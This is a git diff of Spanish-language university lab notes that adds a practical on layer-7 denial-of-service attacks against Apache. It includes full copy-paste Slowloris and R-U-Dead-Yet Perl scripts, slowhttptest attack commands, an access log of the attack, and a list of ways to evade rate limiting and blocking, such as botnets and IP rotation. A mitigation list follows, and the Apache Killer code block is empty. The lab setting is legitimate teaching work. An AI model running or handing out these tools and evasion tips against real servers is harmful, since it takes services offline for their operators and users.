@@ -1668,7 +1668,7 @@ Instalar Apache. El atacante tiene que hacer un ataque DoS en capa 7 al servidor
 
 <br>
 
-1-Instalamos Apache y solo lo activaremos cuando sea necesario:
+Instalamos Apache y solo lo activaremos cuando sea necesario:
 ```bash
 apt install apache2
 ```
@@ -1694,16 +1694,743 @@ systemctl stop apache2
 Si todo va bien podemos ver la plantilla de apache2 aquí: **http://10.11.48.202/**
 
 <br>
+
+**ATAQUES**:
+
+4 tipos de ataques:
+
+1. SLOW HEADERS (SLOWLORIS)
+
+    Mecanismo: Enviar cabeceras HTTP incompletas (sin CRLF final)
+
+    Efecto: Servidor mantiene conexiones abiertas esperando finalización
+
+    Objetivo: Consumir MaxClients de Apache
+
+2. SLOW POST (R-U-DEAD-YET)
+
+    Mecanismo: Peticiones POST con Content-Length grande + envío lento de cuerpo
+
+    Efecto: Servidor espera eternamente los bytes pendientes
+
+    Objetivo: Ocupar conexiones con transferencias incompletas
+
+
+3. RANGE-BASED (APACHE KILLER)
+
+    Mecanismo: Múltiples rangos de bytes superpuestos en cabecera Range
+
+    Efecto: Agotar memoria y CPU procesando rangos duplicados
+
+    Objetivo: Consumir recursos del servidor con peticiones complejas
+
+4. SLOW READ
+
+    Mecanismo: Peticiones legítimas + lectura lenta de respuesta (ACK delay)
+
+    Efecto: Buffer TCP pequeño + retardos en confirmaciones
+
+    Objetivo: Mantener conexiones ocupadas por máximo tiempo
+
+
+Para probar un ataque y comprobar que se ha tiraod el apache hacer:
+```bash
+curl -I http://IP_VICTIMA/
+```
+
+Si el curl falla (queda parado), !funciona!. Cuando se para el ataque vuelve a funcionar el curl.
+
+
+<br>
+
+1-SlowHeaders (SlowLoris):
+
+Consiste en enviar cabeceras http incompletas (sin el CRLF final que indica el final del header) de tal forma que el servidor no considera las sesiones estbalecidas pr completo y las deja abiertas, afectando al número de conexiones máximas configuradas.
+
+<img width="450" height="122" alt="imagen" src="https://github.com/user-attachments/assets/ee438378-336a-4ab5-9058-4b0715bc1f45" />
+
+
+Copiar el código de un repositorio: **https://github.com/GHubgenius/slowloris.pl/blob/master/slowloris.pl**
+```bash
+nano slowloris.pl
+```
+
+Pegar código (tipo GET):
+```bash
+#!/usr/bin/perl -w
+use strict;
+use IO::Socket::INET;
+use IO::Socket::SSL;
+use Getopt::Long;
+use Config;
+
+$SIG{'PIPE'} = 'IGNORE';    #Ignore broken pipe errors
+
+print <<EOTEXT;
+Welcome to Slowloris - the low bandwidth, yet greedy and poisonous HTTP client by Laera Loris
+EOTEXT
+
+my ( $host, $port, $sendhost, $shost, $test, $version, $timeout, $connections );
+my ( $cache, $httpready, $method, $ssl, $rand, $tcpto );
+my $result = GetOptions(
+    'shost=s'   => \$shost,
+    'dns=s'     => \$host,
+    'httpready' => \$httpready,
+    'num=i'     => \$connections,
+    'cache'     => \$cache,
+    'port=i'    => \$port,
+    'https'     => \$ssl,
+    'tcpto=i'   => \$tcpto,
+    'test'      => \$test,
+    'timeout=i' => \$timeout,
+    'version'   => \$version,
+);
+
+if ($version) {
+    print "Version 0.7\n";
+    exit;
+}
+
+unless ($host) {
+    print "Usage:\n\n\tperl $0 -dns [www.example.com] -options\n";
+    print "\n\tType 'perldoc $0' for help with options.\n\n";
+    exit;
+}
+
+unless ($port) {
+    $port = 80;
+    print "Defaulting to port 80.\n";
+}
+
+unless ($tcpto) {
+    $tcpto = 5;
+    print "Defaulting to a 5 second tcp connection timeout.\n";
+}
+
+unless ($test) {
+    unless ($timeout) {
+        $timeout = 100;
+        print "Defaulting to a 100 second re-try timeout.\n";
+    }
+    unless ($connections) {
+        $connections = 1000;
+        print "Defaulting to 1000 connections.\n";
+    }
+}
+
+my $usemultithreading = 0;
+if ( $Config{usethreads} ) {
+    print "Multithreading enabled.\n";
+    $usemultithreading = 1;
+    use threads;
+    use threads::shared;
+}
+else {
+    print "No multithreading capabilites found!\n";
+    print "Slowloris will be slower than normal as a result.\n";
+}
+
+my $packetcount : shared     = 0;
+my $failed : shared          = 0;
+my $connectioncount : shared = 0;
+
+srand() if ($cache);
+
+if ($shost) {
+    $sendhost = $shost;
+}
+else {
+    $sendhost = $host;
+}
+if ($httpready) {
+    $method = "POST";
+}
+else {
+    $method = "GET";
+}
+
+if ($test) {
+    my @times = ( "2", "30", "90", "240", "500" );
+    my $totaltime = 0;
+    foreach (@times) {
+        $totaltime = $totaltime + $_;
+    }
+    $totaltime = $totaltime / 60;
+    print "This test could take up to $totaltime minutes.\n";
+
+    my $delay   = 0;
+    my $working = 0;
+    my $sock;
+
+    if ($ssl) {
+        if (
+            $sock = new IO::Socket::SSL(
+                PeerAddr => "$host",
+                PeerPort => "$port",
+                Timeout  => "$tcpto",
+                Proto    => "tcp",
+            )
+          )
+        {
+            $working = 1;
+        }
+    }
+    else {
+        if (
+            $sock = new IO::Socket::INET(
+                PeerAddr => "$host",
+                PeerPort => "$port",
+                Timeout  => "$tcpto",
+                Proto    => "tcp",
+            )
+          )
+        {
+            $working = 1;
+        }
+    }
+    if ($working) {
+        if ($cache) {
+            $rand = "?" . int( rand(99999999999999) );
+        }
+        else {
+            $rand = "";
+        }
+        my $primarypayload =
+            "GET /$rand HTTP/1.1\r\n"
+          . "Host: $sendhost\r\n"
+          . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
+          . "Content-Length: 42\r\n";
+        if ( print $sock $primarypayload ) {
+            print "Connection successful, now comes the waiting game...\n";
+        }
+        else {
+            print
+"That's odd - I connected but couldn't send the data to $host:$port.\n";
+            print "Is something wrong?\nDying.\n";
+            exit;
+        }
+    }
+    else {
+        print "Uhm... I can't connect to $host:$port.\n";
+        print "Is something wrong?\nDying.\n";
+        exit;
+    }
+    for ( my $i = 0 ; $i <= $#times ; $i++ ) {
+        print "Trying a $times[$i] second delay: \n";
+        sleep( $times[$i] );
+        if ( print $sock "X-a: b\r\n" ) {
+            print "\tWorked.\n";
+            $delay = $times[$i];
+        }
+        else {
+            if ( $SIG{_WARN_} ) {
+                $delay = $times[ $i - 1 ];
+                last;
+            }
+            print "\tFailed after $times[$i] seconds.\n";
+        }
+    }
+
+    if ( print $sock "Connection: Close\r\n\r\n" ) {
+        print "Okay that's enough time. Slowloris closed the socket.\n";
+        print "Use $delay seconds for -timeout.\n";
+        exit;
+    }
+    else {
+        print "Remote server closed socket.\n";
+        print "Use $delay seconds for -timeout.\n";
+        exit;
+    }
+    if ( $delay < 166 ) {
+        print <<EOSUCKS2BU;
+Since the timeout ended up being so small ($delay seconds) and it generally 
+takes between 200-500 threads for most servers and assuming any latency at 
+all...  you might have trouble using Slowloris against this target.  You can 
+tweak the -timeout flag down to less than 10 seconds but it still may not 
+build the sockets in time.
+EOSUCKS2BU
+    }
+}
+else {
+    print
+"Connecting to $host:$port every $timeout seconds with $connections sockets:\n";
+
+    if ($usemultithreading) {
+        domultithreading($connections);
+    }
+    else {
+        doconnections( $connections, $usemultithreading );
+    }
+}
+
+sub doconnections {
+    my ( $num, $usemultithreading ) = @_;
+    my ( @first, @sock, @working );
+    my $failedconnections = 0;
+    $working[$_] = 0 foreach ( 1 .. $num );    #initializing
+    $first[$_]   = 0 foreach ( 1 .. $num );    #initializing
+    while (1) {
+        $failedconnections = 0;
+        print "\t\tBuilding sockets.\n";
+        foreach my $z ( 1 .. $num ) {
+            if ( $working[$z] == 0 ) {
+                if ($ssl) {
+                    if (
+                        $sock[$z] = new IO::Socket::SSL(
+                            PeerAddr => "$host",
+                            PeerPort => "$port",
+                            Timeout  => "$tcpto",
+                            Proto    => "tcp",
+                        )
+                      )
+                    {
+                        $working[$z] = 1;
+                    }
+                    else {
+                        $working[$z] = 0;
+                    }
+                }
+                else {
+                    if (
+                        $sock[$z] = new IO::Socket::INET(
+                            PeerAddr => "$host",
+                            PeerPort => "$port",
+                            Timeout  => "$tcpto",
+                            Proto    => "tcp",
+                        )
+                      )
+                    {
+                        $working[$z] = 1;
+                        $packetcount = $packetcount + 3;  #SYN, SYN+ACK, ACK
+                    }
+                    else {
+                        $working[$z] = 0;
+                    }
+                }
+                if ( $working[$z] == 1 ) {
+                    if ($cache) {
+                        $rand = "?" . int( rand(99999999999999) );
+                    }
+                    else {
+                        $rand = "";
+                    }
+                    my $primarypayload =
+                        "$method /$rand HTTP/1.1\r\n"
+                      . "Host: $sendhost\r\n"
+                      . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
+                      . "Content-Length: 42\r\n";
+                    my $handle = $sock[$z];
+                    if ($handle) {
+                        print $handle "$primarypayload";
+                        if ( $SIG{_WARN_} ) {
+                            $working[$z] = 0;
+                            close $handle;
+                            $failed++;
+                            $failedconnections++;
+                        }
+                        else {
+                            $packetcount++;
+                            $working[$z] = 1;
+                        }
+                    }
+                    else {
+                        $working[$z] = 0;
+                        $failed++;
+                        $failedconnections++;
+                    }
+                }
+                else {
+                    $working[$z] = 0;
+                    $failed++;
+                    $failedconnections++;
+                }
+            }
+        }
+        print "\t\tSending data.\n";
+        foreach my $z ( 1 .. $num ) {
+            if ( $working[$z] == 1 ) {
+                if ( $sock[$z] ) {
+                    my $handle = $sock[$z];
+                    if ( print $handle "X-a: b\r\n" ) {
+                        $working[$z] = 1;
+                        $packetcount++;
+                    }
+                    else {
+                        $working[$z] = 0;
+                        #debugging info
+                        $failed++;
+                        $failedconnections++;
+                    }
+                }
+                else {
+                    $working[$z] = 0;
+                    #debugging info
+                    $failed++;
+                    $failedconnections++;
+                }
+            }
+        }
+        print
+"Current stats:\tSlowloris has now sent $packetcount packets successfully.\nThis thread now sleeping for $timeout seconds...\n\n";
+        sleep($timeout);
+    }
+}
+
+sub domultithreading {
+    my ($num) = @_;
+    my @thrs;
+    my $i                    = 0;
+    my $connectionsperthread = 50;
+    while ( $i < $num ) {
+        $thrs[$i] =
+          threads->create( \&doconnections, $connectionsperthread, 1 );
+        $i += $connectionsperthread;
+    }
+    my @threadslist = threads->list();
+    while ( $#threadslist > 0 ) {
+        $failed = 0;
+    }
+}
+
+__END__
+```
+
+- Abre muchas conexiones HTTP
+
+- Envía headers INCOMPLETOS muy lentamente
+
+- Mantiene las conexiones abiertas indefinidamente
+
+- Consume todos los hilos/hijos de Apache
+
+```bash
+chmod +x slowloris.pl
+cp slowloris.pl /usr/local/bin/slowloris
+```
+
+
+Ataques:
+```bash
+perl slowloris.pl -dns 10.11.48.175 -port 80 -num 300 -timeout 3
+```
+
+Aquí mi compañero puede ver todos los ataques que ha recibido por mi:
+```bash
+tail /var/log/apache2/access.log
+10.11.48.202 - - [04/Nov/2025:13:23:52 +0100] "GET / HTTP/1.1" 400 486 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)"
+10.11.48.175 - - [04/Nov/2025:13:23:52 +0100] "HEAD / HTTP/1.1" 200 255 "-" "curl/7.88.1"
+10.11.48.202 - - [04/Nov/2025:13:23:52 +0100] "GET / HTTP/1.1" 400 486 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)"
+10.11.48.202 - - [04/Nov/2025:13:23:52 +0100] "GET / HTTP/1.1" 400 486 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)"
+10.11.48.202 - - [04/Nov/2025:13:23:52 +0100] "GET / HTTP/1.1" 400 486 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET 
+```
+
+<br>
+
+2-Slow http post body (R-U-Dead-Yet):
+
+Se envían peteciones POST en la cabecera HTTP completa e incluyendo un Content Lnegth con el tamaño en bytes del POST DATA a enviar. Luego se envían menos bytes que los indicados haciendo esperar al servidor sin que rechace la conexión.
+
+<img width="504" height="174" alt="imagen" src="https://github.com/user-attachments/assets/0c77a9af-17bc-4d57-b5cf-5d75769390c4" />
+
+
+Crear archivo:
+```bash
+nano rudy.pl
+```
+
+Copiar:
+```bash
+#!/usr/bin/perl
+use strict;
+use IO::Socket::INET;
+use Getopt::Long;
+
+print "R-U-Dead-Yet (Slow POST) Attack - Educational Use Only\n\n";
+
+# Variables con valores por defecto
+my $target = "127.0.0.1";
+my $port = 80;
+my $num_connections = 5;
+my $timeout = 10;
+my $content_length = 100000;
+my $help = 0;
+
+# Parsear argumentos de línea de comandos
+my $result = GetOptions(
+    "target|t=s"        => \$target,
+    "port|p=i"          => \$port,
+    "connections|c=i"   => \$num_connections,
+    "timeout|o=i"       => \$timeout,
+    "length|l=i"        => \$content_length,
+    "help|h"            => \$help
+);
+
+# Mostrar ayuda si se solicita o no hay parámetros
+if ($help || !$target) {
+    print <<"HELP";
+USO: perl $0 [OPCIONES]
+
+OPCIONES:
+    -t, --target IP         IP o dominio objetivo (requerido)
+    -p, --port NUM          Puerto (default: 80)
+    -c, --connections NUM   Número de conexiones (default: 5)
+    -o, --timeout SEC       Segundos entre envíos (default: 10)
+    -l, --length BYTES      Content-Length a anunciar (default: 100000)
+    -h, --help              Mostrar esta ayuda
+
+EJEMPLOS:
+    perl $0 -t 10.11.48.175 -p 80 -c 10 -o 15
+    perl $0 --target 192.168.1.100 --port 8080 --connections 5 --timeout 20
+    perl $0 -t 10.11.48.175 -c 8 -o 30 -l 500000
+
+HELP
+    exit;
+}
+
+# Validar parámetros
+if ($num_connections <= 0) {
+    die "ERROR: El número de conexiones debe ser mayor a 0\n";
+}
+if ($timeout <= 0) {
+    die "ERROR: El timeout debe ser mayor a 0\n";
+}
+if ($content_length <= 0) {
+    die "ERROR: El Content-Length debe ser mayor a 0\n";
+}
+
+# Mostrar configuración
+print "Configuración del ataque:\n";
+print "  Target:        $target\n";
+print "  Puerto:        $port\n";
+print "  Conexiones:    $num_connections\n";
+print "  Timeout:       $timeout segundos\n";
+print "  Content-Length: $content_length bytes\n\n";
+
+my @sockets;
+my $successful_connections = 0;
+
+print "Estableciendo $num_connections conexiones...\n";
+
+for (my $i = 0; $i < $num_connections; $i++) {
+    my $socket = IO::Socket::INET->new(
+        PeerAddr => $target,
+        PeerPort => $port,
+        Proto    => 'tcp',
+        Timeout  => 5
+    );
+    
+    if ($socket) {
+        # Enviar cabecera POST con Content-Length grande
+        print $socket "POST /upload HTTP/1.1\r\n";
+        print $socket "Host: $target\r\n";
+        print $socket "Content-Type: application/x-www-form-urlencoded\r\n";
+        print $socket "Content-Length: $content_length\r\n";
+        print $socket "User-Agent: RUDY-Attack-Test\r\n";
+        print $socket "\r\n";
+        
+        # Enviar solo una pequeña parte del cuerpo (1% del anunciado)
+        my $initial_data = int($content_length * 0.01);
+        $initial_data = 100 if $initial_data < 100; # Mínimo 100 bytes
+        
+        print $socket "A" x $initial_data;
+        
+        push @sockets, $socket;
+        $successful_connections++;
+        print "Conexión $i establecida (enviados $initial_data bytes de $content_length)\n";
+    } else {
+        print "ERROR: No se pudo establecer conexión $i\n";
+    }
+}
+
+print "\n$successful_connections de $num_connections conexiones establecidas\n";
+print "Manteniendo conexiones abiertas. Presiona Ctrl+C para detener.\n\n";
+
+# Contadores para monitoreo
+my $cycles = 0;
+my $total_data_sent = $successful_connections * int($content_length * 0.01);
+
+# Mantener conexiones abiertas enviando datos lentamente
+while (1) {
+    $cycles++;
+    my $active_connections = 0;
+    
+    foreach my $socket (@sockets) {
+        if ($socket) {
+            # Enviar pequeños fragmentos periódicamente
+            my $chunk_size = 10;
+            if (print $socket "B" x $chunk_size) {
+                $active_connections++;
+                $total_data_sent += $chunk_size;
+            } else {
+                # Conexión cerrada por el servidor
+                $socket = undef;
+            }
+        }
+    }
+    
+    print "Ciclo $cycles - Conexiones activas: $active_connections - Datos totales: $total_data_sent bytes\n";
+    
+    # Eliminar conexiones cerradas
+    @sockets = grep { defined $_ } @sockets;
+    
+    # Si no hay conexiones activas, salir
+    if ($active_connections == 0) {
+        print "\nTodas las conexiones fueron cerradas por el servidor.\n";
+        last;
+    }
+    
+    sleep($timeout);
+}
+
+# Cerrar conexiones restantes al salir
+foreach my $socket (@sockets) {
+    close $socket if $socket;
+}
+
+print "Ataque finalizado.\n";
+```
+
+```bash
+chmod +x rudy.pl
+cp rudy.pl /usr/local/bin/rudy
+```
+
+Probarlo:
+```bash
+perl rudy.pl --t 10.11.48.175 -p 80 -c 200 -o 20
+```
+
+<br>
+
+3-Basado en rangos (Apache Killer):
+
+Se crean numerosas peticiones superponiendo rangos de bytes en la cabecera agotando los recursos de memoria y CPU del servidor.
+
+<img width="499" height="221" alt="imagen" src="https://github.com/user-attachments/assets/3a8cb359-d6a1-49ba-b2ab-cb4b784cb2f9" />
+
+
+Crear archivo:
+```bash
+nano AKiller.pl
+```
+
+Pegar:
+```bash
+
+
+
+```
+
+
+<br>
+
+
+4-Slow Read:
+
+En este caso se envían peticiones HTTP legítimas pero se ralentiza el proceso del lectura de la respuesta retrasando el envío del ACK.
+
+<img width="565" height="364" alt="imagen" src="https://github.com/user-attachments/assets/e63951ab-47b2-4880-869f-ebb554c19c55" />
+
+
+**¿Cómo proteger el servicio ante este tipo de ataque?**
+
+Configurar Apache con:
+
+    mod_reqtimeout: RequestReadTimeout header=10-20,MinRate=1000 body=10-20,MinRate=1000
+
+    mod_evasive: Limitar conexiones por IP (DOSPageCount 2, DOSSiteCount 50)
+
+    mod_security: Reglas contra Slowloris y requests incompletos
+
+    mod_qos: Limitar conexiones concurrentes por IP (QS_SrvMaxConnPerIP 20)
+
+    Ajustar MPM Prefork: Reducir MaxRequestWorkers y KeepAliveTimeout
+
+**¿Y si se produce desde fuera de su segmento de red?**
+
+Implementar:
+
+    Firewall/IPS: Reglas para limitar conexiones HTTP por IP externa
+
+    CDN/WAF: Cloudflare, AWS Shield o Akamai para filtrar tráfico malicioso
+
+    Rate limiting en el balanceador de carga
+
+    IP reputation y listas negras de IPs sospechosas
+
+    CAPTCHA para tráfico sospechoso
+
+**¿Cómo podría tratar de saltarse dicha protección?**
+
+Técnicas de evasión:
+
+    Rotación de IPs: Usar botnets o proxies para distribuir el ataque
+
+    User-Agent aleatorios: Simular tráfico legítimo diverso
+
+    Ataque más lento: Reducir velocidad para evitar detección por rate limiting
+
+    Encripción SSL/TLS: Ocultar patrones del ataque
+
+    Ataque desde múltiples subredes: Evadir bloqueos por segmento de red
+
+    Combinar con tráfico legítimo: Mezclar requests maliciosos con normales
+
+<br>
+
+Los 4 tipos de ataques se pueden probar con **SlowHttpTest**:
+
+- Slowhttptest (Carlos no lo recomienda, solo probamos):
+```bash
+sudo apt install slowhttptest -y
+```
+
+Comandos para hacer un DoS:
+```bash
+slowhttptest -c 1000 -H  -i 10 -r 200 -t GET -u http://10.11.48.175 -x 24 -p 3
+```
+
+Flags del  ataque:
+[-c] -> significa el numero de conexiones que se le manda.
+[-H] -> pone a slowhttp en modo slowloris.
+[-i] -> especifica el intervalo entre los datos de seguimento para pruebas lentas.
+[-r] -> especifica a velocidade de conexión.
+[-u] -> especifica la url a la que se le va a hacer el ataque.
+[-x] -> especifica la longitud máxima de los datos de seguimiento para pruebas slowloris .
+[-p] -> especifica p intervalo de espera da respuesta HTTP en la conexión de la sonda.
+
+Comprobar que se tiró el Apache:
+```bash
+curl -I http://10.11.48.175/
+```
+
+Si NO RESPONDE, verás:
+curl: (7) Failed to connect to 10.11.48.175 port 80: Connection refused
+o se queda colgado.
+
+
+Otros ataques:
+```bash
+#SlowLoris Mode:  Envía las cabeceras sin línea vacía de forma que el servidor espere eternamente
+slowhttptest -c 1000 -H -g -o slowloris_stats -i 10 -r 200 -t GET -u http://IP_VICTIMA -x 24 -p 3
+
+#Slow POST Mode: Reserva espacio para muchas consultas y las mantiene abiertas enviando datos lentamente
+slowhttptest -c 1000 -B -g -o slowpost_stats -i 110 -r 200 -s 8192 -t POST -u http://IP_VICTIMA -x 10 -p 3
+
+# SlowRead Mode: # Lectura lenta de respuestas con ventana TCP pequeña
+slowhttptest -c 1000 -X -g -o slowread_stats -r 200 -w 512 -y 1024 -n 5 -z 32 -u http://IP_VICTIMA -p 3
+```
+
+<br>
 <br>
 
 ---
 
 ### **Apartado m) Instale y configure modsecurity. Vuelva a proceder con el ataque del apartado anterior. ¿Qué acontece ahora?**
 
+> Actualizar todos los módulos de ModSecurity. Nos va mandar realizar ataques sin él primero y ver que nadie defiende. Si ahora atacamos cn ModSecurity activado la máquina si que deberñia defenderse. 
 
-Actualizar todos los módulos de ModSecurity. Nos va mandar realizar ataques sin él primero y ver que nadie defiende. Si ahora atacamos cn ModSecurity activado la máquina si que deberñia defenderse. 
-
-Tienes que defenderse de los 4 ataques posibles que damos!!! En la defensa no probará todos, solo alguno
+> Tienes que defenderse de los 4 ataques posibles que damos!!! En la defensa no probará todos, solo alguno
 
 <br>
 <br>
@@ -2107,6 +2834,7 @@ Una vez que OSSEC funciona, hacer un flush de OSSEC y veremos todo en pantalla. 
 
 
 <br>
+
 
 
 
